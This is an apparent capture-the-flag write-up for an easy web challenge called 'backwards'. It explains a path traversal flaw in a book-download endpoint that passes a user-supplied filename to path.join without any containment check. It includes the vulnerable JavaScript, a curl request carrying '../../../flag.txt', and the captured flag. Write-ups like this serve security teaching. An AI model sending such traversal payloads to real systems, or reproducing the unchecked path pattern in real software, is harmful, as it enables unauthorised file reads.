---
title: "backwards"
ctf: "Friendly CTF 2026"
date: 2026-09-28
category: web
difficulty: easy
author: "L-BOH"
---

# backwards

## Summary

The book-download API trusts a submitted filename. Parent-directory components escape the books directory and read the flag file.

## Root cause

The download endpoint builds a path from submitted input:

~~~javascript
const file = req.body.file;
const filePath = path.join(BOOKS_DIR, file);
res.sendFile(filePath, ...)
~~~

Path joining normalizes parent-directory components; it does not reject them. Because the result is never checked to ensure it is still inside BOOKS_DIR, a filename can escape to /flag.txt.

## Vulnerability

The download button sends a JSON filename to the server. Replacing a normal PDF name with parent-directory sequences is accepted, which reveals path traversal.

## Exploit

Send the traversal filename directly:

~~~bash
curl -s -X POST https://backwards.web2.friendly-ctf.securinets.tn/books/download \
  -H 'Content-Type: application/json' \
  -d '{"file":"../../../flag.txt"}'
~~~

Starting from the books directory, three parent-directory steps reach the filesystem root. The final resolved path is /flag.txt, and the response prints it.

## Flag

~~~text
Securinets{p47h_tr4v3rs4l_lead1ng_t0_file_r34d}
~~~
